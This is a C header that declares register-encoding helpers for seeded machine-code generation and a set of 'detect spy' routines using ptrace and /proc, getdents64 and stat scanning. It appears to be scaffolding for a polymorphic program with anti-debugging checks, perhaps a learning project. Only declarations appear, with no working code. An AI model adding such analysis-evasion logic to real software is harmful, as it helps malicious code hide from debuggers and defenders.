#ifndef GENERATE_UTILS_H
# define GENERATE_UTILS_H

# include <stdint.h>

enum	e_reg
{
	RAX,
	RCX,
	RDX,
	RBX,
	RSP,
	RBP,
	RSI,
	RDI,
	R8,
	R9,
	R10,
	R11,
	R12,
	R13,
	R14,
	R15,
	NB_REG
};

size_t	generate_set_register(void *buffer, uint64_t *seed, size_t size, enum e_reg target, uint64_t value);

/*
** detect spy
*/

void	lab_ptrace_begin(void);
void	lab_ptrace_end(void);
void	lab_proc_begin(void);
void	lab_proc_end(void);
void	lab_open_dir_begin(void);
void	lab_open_dir_end(void);
void	lab_getdent64_begin(void);
void	lab_getdent64_end(void);
void	lab_open_stat_begin(void);
void	lab_open_stat_end(void);
void	lab_read_stat_begin(void);
void	lab_read_stat_end(void);
void	lab_strstr_begin(void);
void	lab_strstr_end(void);
void	lab_close_stat_begin(void);
void	lab_close_stat_end(void);
void	lab_close_dir_begin(void);
void	lab_close_dir_end(void);
void	lab_close_stat_spy_detected_begin(void);
void	lab_close_stat_spy_detected_end(void);
void	lab_close_proc_spy_detected_begin(void);
void	lab_close_proc_spy_detected_end(void);

#endif
